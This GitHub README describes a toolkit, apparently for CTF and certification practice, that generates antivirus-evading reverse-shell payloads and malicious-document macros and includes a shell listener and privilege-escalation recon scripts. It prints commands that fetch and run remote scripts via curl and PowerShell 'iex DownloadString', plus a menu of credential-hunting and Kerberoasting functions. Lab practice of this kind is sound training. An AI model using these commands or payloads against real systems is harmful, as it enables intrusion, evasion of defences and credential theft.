# CTF support tools

> ⚠️ under development

A set of tools that can be used individually or by web interface to help resolve ctfs and pass certifications

![image](https://github.com/user-attachments/assets/047294b3-7c16-4c26-9a19-7dfd61fef423)


- toolpy to download tools
- Shellpy to generate payloads for reverse shells, optionally obfuscated to evade antivirus and in macro format for malicious documents
  (Shellpy can be found here --> https://github.com/KermitPurple96/Shellpy)
- shell.py to receive a reverse shell
- recon.ps1 to assist in the windows privilege escalation process
- recon.sh to assist in the linux privilege escalation process

## Install
```bash
git clone https://github.com/KermitPurple96/CTF-toolkit
cd CTF-toolkit
python3 -m venv .venv
source .venv/bin/activate
pip install pwn flask netifaces watchdog
flask run --host=0.0.0.0 --port=5002 --no-debugger --no-reload
```
## Usage

1. toolpy
```bash
toolpy -d rubeus
```
![image](https://github.com/user-attachments/assets/a9d69157-f2e7-4659-8885-06eb56d6e8b6)

2. [Shellpy](https://github.com/KermitPurple96/Shellpy)
```bash
shellpy <ip> <port> -powercat --obfuscate --macro
```
![shell3](https://github.com/user-attachments/assets/9bb1efe9-bcaa-49b8-b99b-b865b758eefe)
3. Shell listener
```bash
python3 shell.py 443
```
![image](https://github.com/user-attachments/assets/9863b3e7-6d33-4ce4-8974-f2a598920f9c)


3. Load the script on Target Machine

For Linux
```bash
. <(curl 10.10.10.10/recon.sh)
```

For Windows
```powershell
iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
```

Example funtions on windows:
```
PS> iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))

     ___  __    ___   ___
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|

========================================================
                                            DannyDB@~>

[*] Auxiliary Tools:
    - aux.upload [file]               : Upload files to HTTP server via POST
    - aux.download [file]             : Perform GET to retrieve files

[*] Auxiliary Recon:
    - recon.dateScan                  : Files modified between two dates
    - recon.dateLast                  : Files modified less than 15 minutes ago
    - recon.portscan <host> [1-1024]  : Perform port scanning
    - recon.pingscan 10.10.10.        : Perform ping scan of /24 subnet
    - recon.pspy                      : Similar to pspy script
    - recon.servInfo                  : Information abaut a server

[*] General Recon:
    - recon.sys                       : System information
    - recon.users                     : User information
    - recon.programs                  : Program information
    - recon.protections               : Protection information
    - recon.process                   : Process information
    - recon.networks                  : Network information
    - recon.acl                       : File permission information

[*] Privesc Recon:
    - priv.installElev                : AlwaysInstallElevated privilege
    - priv.serv.dir                   : Service directory privilege
    - priv.serv.reg                   : Service registry privilege
    - priv.serv.unq                   : Unquoted service privilege
    - priv.cred.files                 : Known credential files privilege
    - priv.cred.history               : Credential history privilege
    - priv.owned.files                : File owner privilege
    - priv.search.fname               : Credential in file name privilege
    - priv.search.fcontent            : Credential in file content privilege
    - priv.search.sshkeys             : SSH file privilege
    - priv.search.register            : Credential in registry privilege
    - priv.search.events              : Credential in events (Admin.) privilege
    - priv.autorun                    : Scheduled tasks privilege

[*] AD Recon:
    - ad.psremote                     : Remote PowerShell privilege
    - ad.computers                    : Domain computers privilege
    - ad.users                        : Domain users privilege
    - ad.user <user>                  : Information about a user
    - ad.listusers                    : List common names for bruteforce
    - ad.groups                       : Domain groups privilege
    - ad.group <group>                : Information about a group
    - ad.spn                          : Kerberoasting accounts
    - ad.asrep                        : AS-REP Roasting users privilege

```

